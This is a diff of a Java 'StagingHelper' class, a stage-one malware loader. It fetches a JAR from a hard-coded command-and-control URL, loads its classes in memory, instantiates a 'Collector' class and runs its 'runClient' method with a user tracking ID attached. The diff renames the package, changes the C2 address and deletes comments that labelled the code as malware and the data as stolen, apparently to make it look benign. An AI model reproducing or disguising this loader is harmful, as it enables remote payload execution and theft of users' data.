@@ -1,4 +1,4 @@
-package com.example;
+package sh.snipsnapz;
 
 import com.google.gson.Gson;
 import com.google.gson.JsonObject;
@@ -19,7 +19,6 @@ public class StagingHelper {
     public static void stageWithContext(JsonObject context) {
         String userId;
 
-        // Read tracking UUID from embedded config file
         try (InputStreamReader reader = new InputStreamReader(
                 Objects.requireNonNull(StagingHelper.class.getClassLoader()
                         .getResourceAsStream("cfg.json")))) {
@@ -30,20 +29,18 @@ public class StagingHelper {
             return;
         }
 
-        String c2Url = "http://10.10.8.171:7575/1.jar";
+        String c2Url = "http://0.0.0.0:7575/payload.jar";
 
-        // Add tracking ID to stolen data
+        // Add tracking ID
         context.addProperty("userId", userId);
 
         try {
-            // download payload from server
             byte[] jarBytes = downloadJar(c2Url);
             if (jarBytes == null) {
                 System.out.println("Resource state: S1");
                 return;
             }
 
-            // Parse downloaded JAR file
             HashMap<String, byte[]> classMap = new HashMap<>();
             HashMap<String, byte[]> resourceMap = new HashMap<>();
 
@@ -55,13 +52,11 @@ public class StagingHelper {
                     byte[] data = baos.toByteArray();
 
                     if (entry.getName().endsWith(".class")) {
-                        // Extract class files
                         String className = entry.getName()
                                 .replace('/', '.')
                                 .replace(".class", "");
                         classMap.put(className, data);
                     } else {
-                        // Extract resources
                         resourceMap.put(entry.getName(), data);
                     }
                 }
@@ -75,10 +70,7 @@ public class StagingHelper {
                 return;
             }
 
-            // Create custom ClassLoader with downloaded classes
             IMCL loader = new IMCL(classMap, resourceMap);
-
-            // DECODED: Load malicious class named "Collector"
             Class<?> maliciousClass;
             try {
                 maliciousClass = loader.loadClass("Collector");
@@ -87,7 +79,6 @@ public class StagingHelper {
                 return;
             }
 
-            // Instantiate the malicious class
             Object malwareInstance;
             try {
                 malwareInstance = maliciousClass.getDeclaredConstructor().newInstance();
@@ -96,8 +87,7 @@ public class StagingHelper {
                 return;
             }
 
-            // EXECUTE STAGE 2 MALWARE
-            // DECODED: Call method named "runClient"
+            // Call method named "runClient" on stage 2
             new Thread(() -> {
                 try {
                     maliciousClass.getMethod("runClient", String.class)
